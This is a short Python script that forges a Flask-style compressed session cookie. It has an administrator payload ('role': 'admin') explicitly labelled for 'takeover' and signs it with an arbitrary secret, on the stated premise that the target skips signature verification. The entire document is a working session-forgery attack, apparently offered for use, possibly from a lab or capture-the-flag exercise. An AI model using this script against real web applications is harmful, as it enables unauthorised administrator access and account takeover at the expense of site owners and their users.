import hmac
import hashlib
import zlib
import base64
import json
import time

#This one signs the JWT with whatever secret you provide. If you dont need it signed, use the other script...

def create_signed_token(data: dict, secret_key: str, salt: str = "cookie-session") -> str:
    # Add timestamps if not present
    if "iat" not in data:
        data["iat"] = int(time.time())
    if "exp" not in data:
        data["exp"] = data["iat"] + 3600 * 24 * 14  # 2 weeks
    
    json_str = json.dumps(data, separators=(',', ':'), sort_keys=True)
    compressed = zlib.compress(json_str.encode('utf-8'))
    
    # Base64url payload
    payload_b64 = base64.urlsafe_b64encode(compressed).decode('ascii').rstrip('=')
    
    # Timestamp b64 (using current time)
    ts = int(time.time())
    ts_bytes = ts.to_bytes((ts.bit_length() + 7) // 8, 'big')
    ts_b64 = base64.urlsafe_b64encode(ts_bytes).decode('ascii').rstrip('=')
    
    # Signature
    sign_input = f"{payload_b64}.{ts_b64}".encode('utf-8')
    signature = hmac.new(
        secret_key.encode('utf-8'),
        sign_input,
        hashlib.sha1
    ).digest()
    
    sig_b64 = base64.urlsafe_b64encode(signature).decode('ascii').rstrip('=')
    
    return f".{payload_b64}.{ts_b64}.{sig_b64}"

# Modified payload for takeover (use whatever your cookie needs)
session_data = {
    "_permanent": True,
    "company": "Admin Company",
    "email": "admin@router-resellers.com",
    "name": "Admin User",
    "role": "admin"
}

secret = "arbitrary-secret"  # Any string; if verification is off, it won't matter

token = create_signed_token(session_data, secret)

print("Modified token:", token)
